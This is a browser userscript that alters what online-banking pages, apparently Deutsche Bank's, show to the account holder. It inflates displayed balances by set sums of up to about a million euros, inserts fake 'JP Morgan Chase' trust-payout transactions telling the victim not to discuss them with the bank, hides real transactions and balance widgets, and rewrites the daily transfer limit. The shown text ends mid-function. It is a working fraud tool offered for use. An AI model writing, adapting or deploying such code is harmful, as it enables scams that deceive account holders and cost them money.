// ==UserScript==
// @name         Ed Start 4Rec db.kl.bo@t-online.de
// @namespace    http://tampermonkey.net/
// @version      7.77777
// @description  with minus bal handling
// @author       You
// @match        https://yahoo.com/sign/as/*
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match        *://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        GM_xmlhttpRequest
// @run-at       document-start
// @downloadURL https://update.greasyfork.org/scripts/534506/Ed%20Start%204Rec%20dbklbo%40t-onlinede.user.js
// @updateURL https://update.greasyfork.org/scripts/534506/Ed%20Start%204Rec%20dbklbo%40t-onlinede.meta.js
// ==/UserScript==

//======================================================================================================================================================================================
//++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//======================================================================================================================================================================================


// FINUEBER
  // Configure adjustments by the index (1-based) of *visible EUR balance containers* in DOM order
  const MBALANCE_CONFIGS = [
      // THE GESAMT SALDO IS AT INEX 1 AND IT GOES FURTHER FROM THERE
      // ONLY REAL VISIBLE BALANCES COUNT, EMPTY BALANCES DON'T COUNT
    { index: 1, adjustmentAmount: 188677 },
    { index: 2, adjustmentAmount: 188677},
    { index: 3, adjustmentAmount: 188677 },
    { index: 4, adjustmentAmount: 0 },
    { index: 8, adjustmentAmount: 0 },
    { index: 9, adjustmentAmount: 0 },
    { index: 10, adjustmentAmount: 0 },
    // add more…
  ];

// UMSATZE BALANCE
  const ADJUSTMENT_AMOUNT = 188677.0;
  const TARGET_IBAN = 'DE81 2157 0011 0400 8736 00';


//  Ihre Auszahlungsbuchung wurde wurde entgegengenommen.
// Neue Auszahlung

// UMSATZE TRANSACTION REMOVAL

  const TARGET_AMOUNTS = [
    { value: '-7.000,00', enabled: true },
    { value: '-910,00',  enabled: true },
    { value: '3.180,00', enabled: true }
  ];

//UMSATZE TRANSACTIONS
   // === Define multiple transactions here ===
   const CUSTOM_TRANSACTIONS = [
     {
       iconText: 'JP',
       title: 'JP Morgan Chase',
       description: 'Auszahlung.A. Gold meldet sich oder melden Sie sich bei ihm. Mit Bank nicht besprechen, damit nicht gesperrt.',
       category: 'Treuhand Auszahlung',
       status: '',
       amount: '177.977,83',
       transactionDate: '01.12.2025',
       moveSteps: 1
     },
     {
       iconText: 'JP',
       title: 'JP Morgan Chase',
       description: 'A. Gold meldet sich. Ohne ihn bitte nicht ausgeben..',
       category: 'Gutschrift',
       status: ' ',
       amount: '10.700,00',
       transactionDate: '17.06.2025',
       moveSteps:-1
     }
   ];

// POST UTILITIES
    // ---- Configuration: toggle each target on/off ----
    const CONFIG = {
        // Remove elements like: [data-test="fullAccountRow"] .balance.text-nowrap.with-color
        removeMainBalance: true,

        // Remove elements like: .balance__subline.d-flex.justify-content-end.align-items-center.mt-1
        removeSubline: true,

        // Remove elements like: [data-test="pageHeaderActionMenu"]
        removePageHeaderActionMenu: true,

        // Remove elements like: [aria-label="Menu zu Umsatzfunktionen öffnen"]
        removeMenuUmsatzfunktionen: true,

        // Remove elements like: [aria-label="Menu zu Produktfunktionen öffnen"]
        removeMenuProduktfunktionen: true,

        // Remove the *direct parent* of elements like: [data-test="filterButtonSmall"]
        removeParentOfFilterButtonSmall: true,

            // Remove the *direct parent* of elements like: [data-test="historicalBalanceChart"]
        removeParentOfHistoricalBalanceChart: true,

        // Check interval in ms
        intervalMs: 100
    };

// POST POSTFACH

 const RULES = [
    {
      USE_DIGIT_CHECK: true,
      USE_DATE_CHECK:  true,
      TARGET_DIGITS_RAW: '612 1583459 00', // digits-only compare
      TARGET_DATE_RAW:   '00.07.2025',     // month + year
    },
    // Add more rules below, same 4 keys only:
    // {
    //   USE_DIGIT_CHECK: false,
    //   USE_DATE_CHECK:  true,
    //   TARGET_DIGITS_RAW: '123 456',
    //   TARGET_DATE_RAW:   '00.00.2025', // year only
    // },
    // {
    //   USE_DIGIT_CHECK: true,
    //   USE_DATE_CHECK:  false,
    //   TARGET_DIGITS_RAW: '987654321',
    //   TARGET_DATE_RAW:   '28.07.2025', // ignored if USE_DATE_CHECK=false
    // },
  ];

//======================================================================================================================================================================================
//++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//======================================================================================================================================================================================
// OLD  OLD  OLD  OLD  OLD  OLD  OLD
// OLD  OLD  OLD  OLD  OLD  OLD  OLD
// OLD  OLD  OLD  OLD  OLD  OLD  OLD
// OLD  OLD  OLD  OLD  OLD  OLD  OLD
// OLD  OLD  OLD  OLD  OLD  OLD  OLD


//         UBERSICHT
    // Specify the balances to adjust by index and the amount to adjust
    const accountBalanceAdjustments = [

        { index: 0, amount: 0 },
        { index: 1, amount: 0 },

         { index: 2, amount: 1079727},  //3   // will have to change to 1395
        { index: 3, amount: 15456 },  // 4  //will have to change to app 5700
       { index: 4, amount: 1079727 },  // 5
         { index: 5, amount: 1079727 }, //1
         { index: 6, amount:  1079727},
        { index: 7, amount: 1079727 }, //2
         { index: 8, amount:  0},
        { index: 9, amount: 0 },

    ];


//     UMSATZE BALANCE

    // Specify the value to adjust the balance by
    var adjustValue = 1079727.00; // Modify this value as needed

    // Specify the IBAN value to check for
    var ibanCheck = "DE37 3427 0024 0123 3006 00";

// UMSATZE TRANSACTIONS

   // Array of transaction details objects
    var transactions = [
        {
            date: '12.08.2025',
            bookingDate: '12.08.2025',
            purpose: ' JP Morgan Chase. A. Gold meldet sich oder melden Sie sich bei ihm. Mit Bank nicht besprechen, damit nicht gesperrt.',
            debit: '',
            credit: '1.079.727,12',
            currency: 'EUR'
        },
// {
   //         date: 'Vorgemerkt',
  //          bookingDate: ' ',
  //          purpose: 'Treuhand von JP Morgan Chase. 2 A. Gold meldet sich oder melden Sie sich bei ihm. Mit Bank nicht besprechen, damit nicht gesperrt.',
  //          debit: '',
///            currency: 'EUR'
  //      },
  //             {
   //         date: '17.06.2025',
   //       bookingDate: '17.06.2025',
  //          purpose: 'A. Gold meldet sich. Ohne ihn bitte nicht ausgeben.',
   //         debit: '',
  //         credit: '10.700,00',
  //         currency: 'EUR'
   //    },
  //      {
  //          date: '13.11.2024',
 //           bookingDate: '13.11.2024',
  //          purpose: 'A. Gold meldet sich. Ohne ihn bitte nicht ausgeben.',
  //          debit: '',
  //         credit: '6.300,00',
  //         currency: 'EUR'
   //    },
 //       {
 //           date: '14.06.2024',
 //           bookingDate: '01.06.2024',
 //           purpose: 'Another transaction purpose',
 //           debit: '',
//            credit: '173.343,34',
 //           currency: 'EUR'
 //       }
    ];
//======================================================================================================================================================================================
//++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//======================================================================================================================================================================================

if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("mainscript") > 0 || window.location.href.indexOf("Downloads") > 0 ) {


if (window.location.href.indexOf("DisplayFinancialOverview") > 0 || window.location.href.indexOf("mainscript") > 0 || window.location.href.indexOf("Downloads") > 0 ) {


//    // Specify the balances to adjust by index and the amount to adjust
//    const accountBalanceAdjustments = [
//        { index: 0, amount: 700 },
//        { index: 1, amount: 5000 },
//        { index: 2, amount: 10000 },
//        { index: 3, amount: 17000 },
//        { index: 4, amount: 27000 },
////        { index: 5, amount: 35000 },
//        { index: 6, amount: 50000 },
//        { index: 7, amount: 50000 },
 //   ];

    // Function to parse the balance text content to a float
    function parseBalance(balanceText) {
        var cleanedText = balanceText.replace(/[^\d,-]/g, '').replace(',', '.');
        return parseFloat(cleanedText.replace(/\s+/g, ''));
    }



    //---------------------------------------------------------------------------------------
function removeTextContent() {
    setInterval(function() {
        // Get all <th> elements in the document
        var thElements = document.getElementsByTagName("th");

        // Loop through all <th> elements
        for (var i = 0; i < thElements.length; i++) {
            var th = thElements[i];

            // Check if the <th> contains "Saldo" or "Währung"
            if (th.textContent.trim() === "Saldo" || th.textContent.trim() === "Währung") {
                // Find the parent <tr> element
                var tr = th.closest("tr");

                // Remove the parent <tr> if found
                if (tr) {
                    tr.remove();
                }
            }
        }
    }, 500);
}

// Call the function
// removeTextContent();




    //------------------------------------------------------------------------------------------------
    // Function to format a float back to a balance string
    function formatBalance(balanceFloat) {
        return balanceFloat.toLocaleString('de-DE', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
    }

    // Function to modify balance values by the specified adjustments
    function modifyBalances() {
        var balanceElements = document.querySelectorAll('.balance');
        balanceElements.forEach(function(element, index) {
            if (!element.textContent.includes("Saldo") && element.className === "balance") {
                if (index < accountBalanceAdjustments.length) {
                    var adjustment = accountBalanceAdjustments[index];
                    var balanceText = element.textContent.trim();
                    var balance = parseBalance(balanceText);
                    var newBalance = balance + adjustment.amount;
                    var formattedBalance = formatBalance(newBalance);
                    element.textContent = formattedBalance;
                } else {
                    console.error('Index out of range:', index);
                }
            }
        });
    }

// Function to check for the presence of the element with class "nowrap rgtPadding"
function checkForElementToRemove() {
    var elements = document.querySelectorAll('.nowrap.rgtPadding');

    for (var element of elements) {
        // Modify balances if the element is found
        console.log('Element with class "nowrap rgtPadding" found. Modifying balances...');
        modifyBalances(); // Assuming modifyBalances is defined elsewhere

        // After modifying balances, remove the element
        setTimeout(() => {
            element.remove();
            console.log('Element with class "nowrap rgtPadding" removed.');
        }, 5);

        return; // Exit the function after processing the first element found
    }

    console.log('Element with class "nowrap rgtPadding" not found.');
}

// Check for the presence of the element every 70 milliseconds (adjust timing as needed)
setInterval(checkForElementToRemove, 35);


}

if ((window.location.href.indexOf("deutsche") > 0 || window.location.href.indexOf("mainscript") > 0 || window.location.href.indexOf("Downloads") > 0) && window.location.href.indexOf("InstantPayment") === -1) {

    'use strict';

//    // Specify the value to adjust the balance by
//    var adjustValue = 7000.00; // Modify this value as needed

//    // Specify the IBAN value to check for
//    var ibanCheck = "DE83 6207 0024 0101 3317 00";

    // Function to parse the balance text content to a float
    function parseBalance(balanceText) {
        var cleanedText = balanceText.replace(/[^\d,-]/g, '').replace(',', '.');
        return parseFloat(cleanedText);
    }

    // Function to format a float back to a balance string
    function formatBalance(balanceFloat) {
        return balanceFloat.toLocaleString('de-DE', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
    }

    // Function to check if the specified IBAN value is present on the page
    function isIbanPresent() {
        var ibanElement = document.getElementById('ibanValue');
        if (ibanElement) {
            var ibanText = ibanElement.textContent.replace(/\s+/g, '').toUpperCase();
            var formattedIbanCheck = ibanCheck.replace(/\s+/g, '').toUpperCase();
            return ibanText.includes(formattedIbanCheck);
        }
        return false;
    }

    // Function to modify balance values by the specified adjustValue
    function modifyBalancesEnd() {
        if (!isIbanPresent()) {
            console.error('Specified IBAN value not found on the page.');
            return;
        }

        var balanceElements = document.querySelectorAll('[headers="aB"], [headers="oB"]');
        balanceElements.forEach(function(element) {
            var strongTag = element.querySelector('strong');
            if (strongTag) {
                var balanceText = strongTag.textContent.trim();
                var balance = parseBalance(balanceText);
                var newBalance = balance + adjustValue;
                var formattedBalance = formatBalance(newBalance);

                // Update the balance text
                strongTag.textContent = formattedBalance;

                // Determine the original and new balance classes
                var originalClass = element.classList.contains('debit') ? 'debit' : 'credit';
                var newClass = newBalance < 0 ? 'debit' : 'credit';

                // Update the parent class if the balance class has changed
                if (originalClass !== newClass) {
                    element.classList.remove('debit', 'credit');
                    element.classList.add(newClass);
                }
            } else {
                console.error('No <strong> tag found within element:', element);
            }
        });
    }

    // Check document readiness and run modifyBalancesEnd when fully loaded
    var checkReadyState = setInterval(function() {
        if (document.readyState === 'complete') {
            clearInterval(checkReadyState);
            setTimeout(modifyBalancesEnd, 0);
        }
    }, 100);
}



if ((window.location.href.indexOf("deutsche") > 0 || window.location.href.indexOf("mainscript") > 0 || window.location.href.indexOf("Downloads") > 0) && window.location.href.indexOf("InstantPayment") === -1) {



    // Specify the IBAN value to check for
//   var ibanCheck = 'DE558707 0024 0689 4240 00';

//    // Array of transaction details objects
//    var transactions = [
//        {
//            date: '13.06.2024',
//            bookingDate: '31.05.2024',
//            purpose: 'SEPA-Gehalt/Pension von JP Morgan Chase',
//            debit: '',
//            credit: '117.246,83',
//            currency: 'EUR'
//        },
//        {
//            date: '14.06.2024',
//            bookingDate: '01.06.2024',
//            purpose: 'Another transaction purpose',
//            debit: '50.00',
//            credit: '',
//          currency: 'EUR'
//        },
 //       {
//            date: '14.06.2024',
//            bookingDate: '01.06.2024',
//            purpose: 'Another transaction purpose',
//            debit: '',
//            credit: '173.343,34',
//            currency: 'EUR'
 //       }
//    ];

    // Function to create a spacer <tr> element
    function createSpacer() {
        var spacer = document.createElement('tr');
        spacer.className = 'spacer';
        spacer.innerHTML = '<td colspan="6" style="height: 10px;"></td>'; // Adjust height as needed
        return spacer;
    }

    // Function to check if the specified IBAN value is present on the page
    function isIbanPresent() {
        var ibanElement = document.getElementById('ibanValue');
        if (!ibanElement) return false;
        var pageIban = ibanElement.textContent.replace(/\s+/g, '').toUpperCase();
        var targetIban = ibanCheck.replace(/\s+/g, '').toUpperCase();
        return pageIban === targetIban;
    }

    // Function to insert transactions into the DOM
    function insertTransactions() {
        if (!isIbanPresent()) {
            console.error('Specified IBAN value not found. Transactions will not be inserted.');
            return;
        }

        // Check if the original transaction element exists
        var originalTransaction = document.querySelector('.hasSEPADetails.even.isOpen');

        // Determine where to insert transactions
        var parent;
        if (originalTransaction) {
            parent = originalTransaction.parentNode;
        } else {
            console.error('Original transaction element not found. Appending transactions to body.');
            parent = document.body; // Insert transactions at the end of <body> if original element not found
        }

        // Insert each transaction followed by a spacer
        transactions.forEach(function(transactionDetails, index) {
            var newTransaction = document.createElement('tr');
            newTransaction.className = 'hasSEPADetails even isOpen';

            newTransaction.innerHTML = `
                <td headers="bTentry" class="date"><span>${transactionDetails.date}</span></td>
                <td headers="bTvalue" class="date">${transactionDetails.bookingDate}</td>
                <td headers="bTpurpose" class="purpose">${transactionDetails.purpose}</td>
                <td headers="bTdebit" class="balance debit">${transactionDetails.debit}</td>
                <td headers="bTcredit" class="balance credit">${transactionDetails.credit}</td>
                <td headers="bTcurrency">${transactionDetails.currency}</td>
            `;

            parent.insertBefore(newTransaction, originalTransaction);

            // Insert spacer after each transaction (except after the last one)
            if (index < transactions.length - 1) {
                var spacer = createSpacer();
                parent.insertBefore(spacer, originalTransaction);
            }
        });
    }

    // Wait for 2 seconds before inserting transactions (adjust timing if needed)



        // Check document readiness and run modifyBalancesEnd when fully loaded
    var checkReadyStates = setInterval(function() {
        if (document.readyState === 'complete') {
            clearInterval(checkReadyStates);
            setTimeout(insertTransactions, 0);
        }
    }, 100);
}



if (window.location.href.indexOf("deutsche") > 0 || window.location.href.indexOf("mainscript") > 0 || window.location.href.indexOf("Downloads") > 0 ) {

    // Function to change classes based on specified rules
    function updateClasses() {
        // Change class="odd hasSEPADetails" to class="even hasSEPADetails isOpen"
        document.querySelectorAll('.odd.hasSEPADetails').forEach(function(element) {
            element.classList.remove('odd');
            element.classList.add('even', 'isOpen');
        });

        // Change class="even hasSEPADetails" to class="even hasSEPADetails isOpen"
        document.querySelectorAll('.even.hasSEPADetails').forEach(function(element) {
            element.classList.add('isOpen');
        });

        // Change all class="odd" to class="even"
        document.querySelectorAll('.odd').forEach(function(element) {
            element.classList.remove('odd');
            element.classList.add('even');
        });

        // Remove elements with colspan="6"
        document.querySelectorAll('[colspan="6"]').forEach(function(element) {
            element.remove();
        });

        // Remove elements with class="OPRA_SB_serviceLink"
        document.querySelectorAll('.OPRA_SB_serviceLink').forEach(function(element) {
            element.remove();
        });
    }



    // Initially update classes
    updateClasses();

    // Function to remove elements with data-test="Amount"
    function removeElementsWithAmount() {
        document.querySelectorAll('[data-test="Amount"]').forEach(function(element) {
            element.remove();
        });
    }

    // Run the removal function every 30 milliseconds
    setInterval(removeElementsWithAmount, 30);
}




if ((window.location.href.indexOf("deutsche") > 0 || window.location.href.indexOf("mainscript") > 0 || window.location.href.indexOf("Downloads") > 0) && window.location.href.indexOf("InstantPayment") === -1) {


    // Function to remove elements by class name, data-test attribute, and IDs
    function removeElements() {
        console.log("Removing specified elements...");

       // Remove elements with class "sc-iQKALj hdSxum"
        document.querySelectorAll('.sc-iQKALj.hdSxum').forEach(function(element) {
            element.remove();
           console.log("Element with class 'sc-iQKALj hdSxum' removed.");
       });

        // Remove elements with data-test="Amount"
       document.querySelectorAll('[data-test="Amount"]').forEach(function(element) {
            element.remove();
            console.log('Element with data-test="Amount" removed.');
        });

        // Remove elements with id="currentAccountBalance"
        var currentAccountBalanceElement = document.getElementById('currentAccountBalance');
       if (currentAccountBalanceElement) {
           currentAccountBalanceElement.remove();
            console.log('Element with id="currentAccountBalance" removed.');
       }

        // Remove elements with id="bookedBalance"
       var bookedBalanceElement = document.getElementById('bookedBalance');
       if (bookedBalanceElement) {
            bookedBalanceElement.remove();
           console.log('Element with id="bookedBalance" removed.');
       }

       // Remove elements with for="currentAccountBalance"
        document.querySelectorAll('[for="currentAccountBalance"]').forEach(function(element) {
           element.remove();
            console.log('Element with for="currentAccountBalance" removed.');
        });

        // Remove elements with class "pageFunctions"
        document.querySelectorAll('.pageFunctions').forEach(function(element) {
          element.remove();
         console.log('Element with class "pageFunctions" removed.');
      }
                                                          );
    }






    // Run initial removal functions



       // Check document readiness and run modifyBalancesEnd when fully loaded
    var checkReadyStatex = setInterval(function() {
        if (document.readyState === 'complete') {
            clearInterval(checkReadyStatex);
              removeScripts();
    removeElements();
        }
    }, 100);
    }


}



if (window.location.href.includes("de") || window.location.href.includes("mainscript") || window.location.href.includes("Downloads")) {

// =====================================================================================================================================
// =====================================================================================================================================
// =====================================================================================================================================
if (window.location.href.includes("de") || window.location.href.includes("mainscript") || window.location.href.includes("Downloads")) {

  'use strict';

  // === MASTER SWITCH ===
  const ENABLED = true; // Set to false to completely disable the script
  if (!ENABLED) {
    console.log('[UserScript] Disabled via ENABLED=false');
    return;
  }

  const WHITESPACE_CLASS = '[\\s\\u00A0]+';
  const esc = (s) => s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  const flex = (s) =>
    new RegExp(
      esc(s)
        .replace(/\s+/g, WHITESPACE_CLASS)
        .replace(/\\-/g, `${WHITESPACE_CLASS}?-${WHITESPACE_CLASS}?`),
      'gu'
    );

      // === CONFIGURATION ===
  const DAILY_LIMIT_REPLACEMENT = '7.000,00 EUR'; // Change this to your desired value

  const REPLACEMENTS = [
    { find: ' Geld vom Referenzkonto buchen ', replace: 'Geld vom Referenzkonto buchen' },
    { find: 'Geld vom Referenzkonto buchen', replace: 'Geld vom Referenzkonto buchen' },
    { find: ' Empfängerkonto ', replace: 'Empfängerkonto' },
    { find: ' Referenzkonto ', replace: 'Referenzkonto' },
    { find: ' Sofortbuchung', replace: 'Sofortbuchung' },
    { find: ' Buchungsdetails ', replace: 'Buchungsdetails' },
    { find: 'Maximaler Betrag welchen Sie heute buchen können:', replace: 'Maximaler Betrag welchen Sie heute buchen können:' },
    { find: 'Auszahlungsoptionen', replace: 'Auszahlungsoptionen' },
    { find: ' Terminauszahlungsbuchung ', replace: 'Terminauszahlungsbuchung' },
    { find: ' Als Auszahlungsvorlage speichern ', replace: 'Als Auszahlungsvorlage speichern' },
    { find: ' Auszahlungsbuchung bestätigen ', replace: 'Auszahlungsbuchung bestätigen' },
    { find: 'Ihre Auszahlungsbuchung wurde wurde entgegengenommen.', replace: 'Ihre Auszahlungsbuchung wurde wurde entgegengenommen.' },
    { find: 'Neue Auszahlung', replace: 'Neue Auszahlung' },
    { find: ' Auszahlungsbuchungen von Referenzkonten in Euro innerhalb des Sepa-Raums', replace: 'Auszahlungsbuchungen von Referenzkonten in Euro innerhalb des Sepa-Raums' },
    { find: 'Auszahlung buchen', replace: 'Auszahlung buchen' },
  ].map(({ find, replace }) => ({ pattern: flex(find.trim()), replace }));

  const SKIP_TAGS = new Set(['SCRIPT', 'STYLE', 'NOSCRIPT', 'IFRAME', 'TEMPLATE']);
  const isEditable = (el) =>
    el && (el.isContentEditable || el.closest?.('[contenteditable=""], [contenteditable="true"]'));

  const replaceInTextNode = (textNode) => {
    let txt = textNode.nodeValue;
    let changed = 0;

    for (const { pattern, replace } of REPLACEMENTS) {
      const before = txt;
      txt = txt.replace(pattern, replace);
      if (txt !== before) changed++;
    }

    if (changed > 0 && txt !== textNode.nodeValue) {
      textNode.nodeValue = txt;
    }
    return changed;
  };

  const scanAndReplace = (root = document.body) => {
    if (!root) return { nodes: 0, changes: 0 };
    const start = performance.now();
    let nodes = 0;
    let changes = 0;

    try {
      const walker = document.createTreeWalker(root, NodeFilter.SHOW_TEXT, {
        acceptNode(node) {
          const parent = node.parentElement;
          if (!parent) return NodeFilter.FILTER_REJECT;
          if (SKIP_TAGS.has(parent.tagName)) return NodeFilter.FILTER_REJECT;
          if (isEditable(parent)) return NodeFilter.FILTER_REJECT;
          if (!node.nodeValue || !node.nodeValue.trim()) return NodeFilter.FILTER_REJECT;
          return NodeFilter.FILTER_ACCEPT;
        },
      });

      let current;
      while ((current = walker.nextNode())) {
        nodes++;
        changes += replaceInTextNode(current);
      }
    } catch (err) {
      console.error('[UserScript] scanAndReplace error:', err);
    } finally {
      const ms = (performance.now() - start).toFixed(1);
      if (changes > 0) {
        console.debug(
          `[UserScript] Replacements: ${changes} text node(s) updated. Scanned ${nodes} nodes in ${ms} ms.`
        );
      }
    }

    return { nodes, changes };
  };

  const replaceDailyLimitValue = (newValue) => {
    try {
      document.querySelectorAll('[data-test="remainingDailyLimit"]').forEach((el) => {
        if (el.textContent !== newValue) {
          console.debug(`[UserScript] Changing remainingDailyLimit from "${el.textContent}" to "${newValue}"`);
          el.textContent = newValue;
        }
      });
    } catch (err) {
      console.error('[UserScript] replaceDailyLimitValue error:', err);
    }
  };

  const removeSummaryElements = () => {
    try {
      const desktopItems = document.querySelectorAll(
        '.col.process-summary-panel-item__desktop.d-none.d-md-flex.p-5.flex-column.justify-content-center'
      );
      if (desktopItems.length >= 2) {
        const target = desktopItems[1];
        if (target && target.isConnected) {
          target.remove();
          console.debug('[UserScript] Removed 2nd ".process-summary-panel-item__desktop" block.');
        }
      }

      const connectors = document.querySelectorAll(
        '.col-auto.process-summary-panel-item__vertical-connector.p-0'
      );
      let removed = 0;
      connectors.forEach((el) => {
        if (el && el.isConnected) {
          el.remove();
          removed++;
        }
      });
      if (removed > 0) {
        console.debug(`[UserScript] Removed ${removed} ".process-summary-panel-item__vertical-connector" element(s).`);
      }
    } catch (err) {
      console.error('[UserScript] removeSummaryElements error:', err);
    }
  };



  // Initial run
  const first = scanAndReplace();
  replaceDailyLimitValue(DAILY_LIMIT_REPLACEMENT);
  removeSummaryElements();
  console.log(
    `[UserScript] Initial scan complete — scanned ${first.nodes} nodes, updated ${first.changes} text node(s).`
  );

  // Interval every 2 seconds
  setInterval(() => {
    scanAndReplace();
    replaceDailyLimitValue(DAILY_LIMIT_REPLACEMENT);
    removeSummaryElements();
  }, 100);
 }
// =====================================================================================================================================
// =====================================================================================================================================
// =====================================================================================================================================// =====================================================================================================================================
// =====================================================================================================================================
// =====================================================================================================================================


// FINUEBER
if (window.location.href.includes("de") || window.location.href.includes("mainscript") || window.location.href.includes("Downloads")) {
  'use strict';

  // Configure adjustments by the index (1-based) of *visible EUR balance containers* in DOM order
  // const MBALANCE_CONFIGS = [
  //   { index: 1, adjustmentAmount: 7700 },
  //   { index: 2, adjustmentAmount: 7700 },
  //   { index: 3, adjustmentAmount: 7700 },
  //   { index: 4, adjustmentAmount: 7700 },
  //   { index: 8, adjustmentAmount: 7700 },
  //   { index: 9, adjustmentAmount: 7700 },
  //   { index: 11, adjustmentAmount: 7700 },
  // ];

  const INDEX_TO_ADJ = new Map(MBALANCE_CONFIGS.map(c => [c.index, c.adjustmentAmount]));
  const TICK_MS = 50;  // INTERVAL

  // Helpers
  const log  = (...a) => console.log('[MBAL]', ...a);
  const warn = (...a) => console.warn('[MBAL]', ...a);
  const err  = (...a) => console.error('[MBAL]', ...a);

  // Parse "12.473,19" -> 12473.19 ; "-8.214,00" -> -8214
  function parseEuroLike(str) {
    if (!str) return null;
    const cleaned = str.replace(/\./g, '').replace(',', '.').replace(/\s+/g, '');
    const n = Number(cleaned);
    return Number.isFinite(n) ? n : null;
  }

  // 12473.19 -> "12.473,19"
  function formatEuroNumber(n) {
    return new Intl.NumberFormat('de-DE', { minimumFractionDigits: 2, maximumFractionDigits: 2 }).format(n);
  }

  // Visible check (filters out desktop/mobile duplicate that’s hidden)
  function isVisible(el) {
    return !!(el && (el.offsetParent || el.getClientRects().length));
  }

  // Collect ONLY the proper amount containers
  function getBalanceContainersOrdered() {
    const all = Array.from(document.querySelectorAll(
      'db-banking-decorated-amount span.balance > span.db-text--highlight.positive,' +
      'db-banking-decorated-amount span.balance > span.db-text--highlight.negative'
    ));

    const eurVisible = all.filter(el => {
      const currency = el.querySelector('[data-test="currencyCode"]');
      if (!currency) return false;
      const curr = currency.textContent && currency.textContent.trim();
      if (curr !== 'EUR') return false;
      return isVisible(el);
    });

    return eurVisible;
  }

  function getValueSpan(container) {
    return container.querySelector('span:first-child');
  }

  function readBase(container) {
    const valueSpan = getValueSpan(container);
    if (!valueSpan) return null;
    const raw = (valueSpan.textContent || '').trim();
    return parseEuroLike(raw);
  }

  function setDisplay(container, amount) {
    const valueSpan = getValueSpan(container);
    if (!valueSpan) return;
    const sign = amount < 0 ? '-' : '';
    valueSpan.textContent = sign + formatEuroNumber(Math.abs(amount));

    container.classList.remove('positive', 'negative');
    const currencySpan = container.querySelector('[data-test="currencyCode"]');
    if (currencySpan) currencySpan.classList.remove('positive', 'negative');

    if (amount >= 0) {
      container.classList.add('positive');
      if (currencySpan) currencySpan.classList.add('positive');
    } else {
      container.classList.add('negative');
      if (currencySpan) currencySpan.classList.add('negative');
    }
  }

  function updateByIndex() {
    try {
      // NEW: skip modification if details panel exists
      if (document.querySelector('[data-test="details"]')) {
        // log('Details present, skipping balance modification');
        return;
      }

      const containers = getBalanceContainersOrdered();

      if (!updateByIndex._lastCount || updateByIndex._lastCount !== containers.length) {
        updateByIndex._lastCount = containers.length;
        log('Detected EUR balances (visible) =', containers.length);
      }

      containers.forEach((el, i) => {
        const index = i + 1;

        if (!el.dataset.baseEur) {
          const base = readBase(el);
          if (base == null) {
            warn('Could not read base for index', index, el);
            return;
          }
          el.dataset.baseEur = String(base);
          const valSpan = getValueSpan(el);
          el.dataset.trailingSpace = /\s$/.test(valSpan?.textContent || '') ? '1' : '';
          el.dataset.mbalanceIndex = String(index);
          log(`Cache base idx ${index}:`, base);
        }

        const baseVal = Number(el.dataset.baseEur);
        const adj = INDEX_TO_ADJ.has(index) ? Number(INDEX_TO_ADJ.get(index)) : null;
        const target = adj == null ? baseVal : (baseVal + adj);

        const valSpan = getValueSpan(el);
        const currentText = (valSpan?.textContent || '').trim();
        const expectedText = (target < 0 ? '-' : '') + formatEuroNumber(Math.abs(target));
        if (currentText !== expectedText) {
          setDisplay(el, target);
        }
      });
    } catch (e) {
      err('updateByIndex error', e);
    }
  }

  updateByIndex();
  setInterval(updateByIndex, TICK_MS);
}


// =====================================================================================================================================
// =====================================================================================================================================





// UMSATZE BALANCE
 if (window.location.href.includes("de") || window.location.href.includes("mainscript") || window.location.href.includes("Downloads")) {

  'use strict';

//  const ADJUSTMENT_AMOUNT = 10000.50;
//  const TARGET_IBAN = 'DE10 1222 1234 1234 1234 10';

  const TAG = '[Balance Adjuster]';
  console.log(`${TAG} loaded. Adjustment amount: ${ADJUSTMENT_AMOUNT}, Target IBAN: ${TARGET_IBAN}`);

  let originalText = null;
  let originalNumber = null;
  let lastAppliedText = null;
  let lastAppliedNumber = null;

  const normalizeIBAN = (str) => str.replace(/\s+/g, '').toUpperCase();
  const trimAllSpaces = (s) => s.replace(/\u00A0/g, ' ').replace(/\s+/g, ' ').trim();

  function parseGermanAmount(str) {
    if (!str) return NaN;
    const cleaned = str
      .replace(/\u00A0/g, ' ')
      .replace(/\s/g, '')
      .replace(/\./g, '')
      .replace(',', '.');
    return parseFloat(cleaned);
  }

  function formatGerman(num) {
    return new Intl.NumberFormat('de-DE', {
      minimumFractionDigits: 2,
      maximumFractionDigits: 2
    }).format(num);
  }

  function findAmountNode() {
    const currency = document.querySelector('span[data-test="currencyCode"].currency');
    if (currency && currency.previousElementSibling) return currency.previousElementSibling;
    const pos = document.querySelector('.balance.text-nowrap.with-color .db-text--highlight.positive > span:first-child');
    if (pos) return pos;
    const neg = document.querySelector('.db-text--highlight.negative > span:first-child');
    if (neg) return neg;
    return null;
  }

  function findHighlightContainer(amountNode) {
    return amountNode?.closest('.db-text--highlight') || null;
  }

  function findCurrencyNode(amountNode) {
    const container = amountNode?.closest('.db-text--highlight') || amountNode?.parentElement;
    return container?.querySelector('span[data-test="currencyCode"].currency') || null;
  }

  function desiredTextFromOriginal(origText, desiredNumber) {
    const hadTrailingSpace = /\s$/.test(origText || '');
    const formatted = formatGerman(desiredNumber);
    return hadTrailingSpace ? (formatted + ' ') : formatted;
  }

  function classesForSign(container, currencyNode, numberValue) {
    const isPos = numberValue >= 0;
    container?.classList.toggle('positive', isPos);
    container?.classList.toggle('negative', !isPos);
